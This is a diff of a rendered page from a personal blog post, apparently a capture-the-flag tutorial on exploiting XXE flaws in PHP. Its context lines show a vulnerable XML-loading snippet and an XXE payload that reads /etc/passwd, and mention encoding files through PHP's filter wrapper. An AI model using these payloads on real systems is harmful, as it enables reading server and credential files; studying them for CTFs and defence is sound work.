@@ -92,14 +92,14 @@
 
 
 
-<meta name="description" content="最近刷题碰到了好几个考察XXE漏洞利用的，想着总结一下常用解题姿势 有回显12345$dom &#x3D; new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $test &#x3D; simplexml_import_dom($dom);echo $test;highlight_file(__FILE__);">
+<meta name="description" content="最近刷题碰到了好几个考察XXE漏洞利用的，想着总结一下常用解题姿势 有回显12345$dom &#x3D; new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $test &#x3D; simplexml_import_dom($dom);echo $test;highlight_file(__FILE__); bu">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XXE利用方法">
 <meta property="og:url" content="http://www.zxfireworks.xyz/post/f7708bc5.html">
 <meta property="og:site_name" content="w1ndy">
-<meta property="og:description" content="最近刷题碰到了好几个考察XXE漏洞利用的，想着总结一下常用解题姿势 有回显12345$dom &#x3D; new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $test &#x3D; simplexml_import_dom($dom);echo $test;highlight_file(__FILE__);">
+<meta property="og:description" content="最近刷题碰到了好几个考察XXE漏洞利用的，想着总结一下常用解题姿势 有回显12345$dom &#x3D; new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $test &#x3D; simplexml_import_dom($dom);echo $test;highlight_file(__FILE__); bu">
 <meta property="article:published_time" content="2020-08-04T12:34:01.000Z">
-<meta property="article:modified_time" content="2020-08-05T07:04:52.968Z">
+<meta property="article:modified_time" content="2020-11-22T13:19:25.471Z">
 <meta property="article:author" content="w1ndy">
 <meta name="twitter:card" content="summary">
 
@@ -342,8 +342,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-08-05T15:04:52+08:00">
-                2020-08-05
+              <time title="更新于" itemprop="dateModified" datetime="2020-11-22T21:19:25+08:00">
+                2020-11-22
               </time>
             
           </span>
@@ -410,7 +410,6 @@
       
         <p>最近刷题碰到了好几个考察XXE漏洞利用的，想着总结一下常用解题姿势</p>
 <h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dom</span> = new DOMDocument();</span><br><span class="line"><span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line"><span class="variable">$test</span> = simplexml_import_dom(<span class="variable">$dom</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$test</span>;</span><br><span class="line">highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
-<a id="more"></a>
 <p>burp抓包后直接修改xml实体，常用Payload如下</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE w1ndy [</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM <span class="string">"file:///etc/passwd"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;w1ndy&gt;&amp;xxe;&lt;/w1ndy&gt;</span><br></pre></td></tr></table></figure>
 <p>上述方法也有缺陷，当里待读取的文件中含有&lt;&gt;//,&amp;等特殊字符时，file协议是无法读取的，所以可以利用php的filter伪协议将文件内容base64编码后再读出来</p>
@@ -542,7 +541,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">49</span>
+                  <span class="site-state-item-count">44</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
